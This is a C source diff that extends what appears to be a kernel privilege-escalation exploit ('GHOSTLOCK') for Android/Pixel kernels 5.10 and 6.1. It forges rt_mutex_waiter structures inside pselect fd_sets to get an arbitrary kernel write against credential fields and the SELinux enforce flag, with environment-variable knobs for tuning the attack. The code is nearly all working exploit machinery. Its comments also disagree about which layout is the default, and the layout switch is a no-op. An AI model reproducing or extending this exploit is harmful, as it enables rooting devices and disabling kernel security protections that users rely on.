@@ -337,6 +337,19 @@ static int pselect_put_global_word(
 }
 
 static int pselect_waiter_shift(void) {
+  /* Runtime override for stack-layout tuning: the shift depends on the
+   * kernel's pselect call-chain frame usage, which differs between the
+   * stock kernel and patched kernels (e.g. KP/Magisk hooks add frames). */
+  const char *s = getenv("GHOSTLOCK_SHIFT");
+  if (s && *s) {
+    int v = atoi(s);
+    static int logged = 0;
+    if (!logged) {
+      pr_info("pselect shift override: %d\n", v);
+      logged = 1;
+    }
+    return v;
+  }
   return active_offsets ? active_offsets->pselect_waiter_shift
                         : PSELECT_WAITER_WORD_SHIFT;
 }
@@ -374,6 +387,25 @@ void open_selected_fds(
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
 
+struct pselect_waiter_word {
+  int word;
+  uint64_t value;
+  const char *name;
+};
+
+#define NWORDS(a) (sizeof(a) / sizeof((a)[0]))
+
+/* Resolve an entry by its fd_set word number (NOT its array position). */
+static struct pselect_waiter_word *pww_find(struct pselect_waiter_word *w,
+                                            size_t n, int word) {
+  for (size_t i = 0; i < n; i++) {
+    if (w[i].word == word) {
+      return &w[i];
+    }
+  }
+  return &w[0]; /* unreachable for the tables below; keep it total */
+}
+
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
@@ -382,13 +414,83 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   int words_per_set = pselect_words_per_set();
   int compact = active_offsets && active_offsets->compact_waiter;
 
-  struct pselect_waiter_word {
-    int word;
-    uint64_t value;
-    const char *name;
-  };
-
-  if (compact) {
+  if (compact && is_5_10_waiter()) {
+    /* 5.10 compact: rt_mutex_waiter is
+     *   tree_entry(0x0) pi_tree_entry(0x18) task(0x30) lock(0x38)
+     *   prio(0x40) deadline(0x48)  -- size 0x50, no wake_state/ww_ctx.
+     * waiter word N maps to waiter + (N-2)*8, so word 10 is waiter+0x40:
+     * on 5.10 that is prio alone in the low half (6.1 packs wake_state
+     * there and prio in the high half). word 12 (0x50) is past the 5.10
+     * struct, so it is dropped. */
+    /* GHOSTLOCK_LAYOUT=A restores layout A (pc=value, right=0, left=target),
+     * which is what every successful run so far used: the route-setup logs of
+     * gl3_root_success / gl_oops_trap / gl_retry_r5 all show
+     *   in0 = in3 = value, out0 = target
+     * i.e. layout A -- and W2 survived there. Layout B (pc=target-8,
+     * right=value, left=0) has never produced a W2 survival in 30+ attempts,
+     * even though its side write lands on cred.usage instead of cred.uid.
+     * A/B them explicitly rather than reasoning further. */
+    int layout_a = 1;  /* default = layout A: the layout used by all 6 successful runs */
+    {
+      const char *L = getenv("GHOSTLOCK_LAYOUT");
+      if (L && (L[0] == 'A' || L[0] == 'a')) layout_a = 1;
+    }
+    struct pselect_waiter_word words[] = {
+      /* Layout B is the default; GHOSTLOCK_LAYOUT=A swaps in layout A.
+       * See the note above for why both must be measured, not argued. */
+      {2, layout_a ? fake_right : pselect_custom_target - 8, "tree_pc"},
+      {3, layout_a ? (uint64_t)0 : fake_right, "tree_right"},
+      {4, layout_a ? pselect_custom_target : (uint64_t)0, "tree_left"},
+      {5, layout_a ? fake_right : pselect_custom_target - 8, "pi_pc"},
+      {6, layout_a ? (uint64_t)0 : fake_right, "pi_right"},
+      {7, layout_a ? pselect_custom_target : (uint64_t)0, "pi_left"},
+      {8, fake_task, "task"},
+      {9, fake_lock, "lock"},
+      {10, (uint64_t)FAKE_WAITER_PRIO, "prio"},
+      {11, 0, "deadline"},
+    };
+    /* GHOSTLOCK_WORD_TWEAK: probe which fd_set words actually reach the
+     * kernel's erase. Each letter perturbs one field; W1's success rate
+     * (system /sys/fs/selinux/enforce == 0) is the observable.
+     *  A: pc injection zeroed (words 2/5)   B: rb_right = target (word 3)
+     *  C: prio = 0 (word 10)                D: task = NULL (word 8)
+     *  E: tree_left = target+8 (word 4)     F: lock = 0 (word 9)
+     *  G: pc = payload CRED_COPY_OFF (nonzero content) tests whether the
+     *     write is *(left) := *(pc) [dereferenced] or *(left) := pc. */
+    /* The knobs below are documented by fd_set WORD NUMBER (words[i].word),
+     * which is NOT the array position: word 2 is at index 0 and so on. Index
+     * by .word explicitly -- using the literal previously hit the wrong
+     * fields (A zeroed tree_left instead of pc) and words[10] was an
+     * out-of-bounds write past this 10-element array. */
+    const char *tw = getenv("GHOSTLOCK_WORD_TWEAK");
+    if (tw) {
+      struct pselect_waiter_word *w2 = pww_find(words, NWORDS(words), 2);
+      struct pselect_waiter_word *w3 = pww_find(words, NWORDS(words), 3);
+      struct pselect_waiter_word *w4 = pww_find(words, NWORDS(words), 4);
+      struct pselect_waiter_word *w5 = pww_find(words, NWORDS(words), 5);
+      struct pselect_waiter_word *w7 = pww_find(words, NWORDS(words), 7);
+      struct pselect_waiter_word *w8 = pww_find(words, NWORDS(words), 8);
+      struct pselect_waiter_word *w9 = pww_find(words, NWORDS(words), 9);
+      struct pselect_waiter_word *w10 = pww_find(words, NWORDS(words), 10);
+      if (strchr(tw, 'A')) { w2->value = 0; w5->value = 0; }
+      if (strchr(tw, 'B')) { w3->value = pselect_custom_target; }
+      if (strchr(tw, 'C')) { w10->value = 0; }
+      if (strchr(tw, 'D')) { w8->value = 0; }
+      if (strchr(tw, 'E')) { w4->value += 8; w7->value += 8; }
+      if (strchr(tw, 'F')) { w9->value = 0; }
+      if (strchr(tw, 'G')) {
+        w2->value = w5->value =
+            (uintptr_t)fake_w0 + (uintptr_t)CRED_COPY_OFF - (uintptr_t)W0_OFF;
+      }
+    }
+    pr_info("DBG-PSELECT 5.10 fake_right=%016zx fake_fops=%016zx target=%016zx pselect_custom_write=%d\n",
+            (uintptr_t)fake_right, (uintptr_t)fake_fops, pselect_custom_target, pselect_custom_write);
+    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+      struct pselect_waiter_word *w = &words[i];
+      pselect_put_waiter_word(
+          in, out, ex, words_per_set, w->word, w->value, w->name);
+    }
+  } else if (compact) {
     /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
      * the write value, children the write target; waiter->task is the
      * payload fake_task (planted fields for the PI walk). */
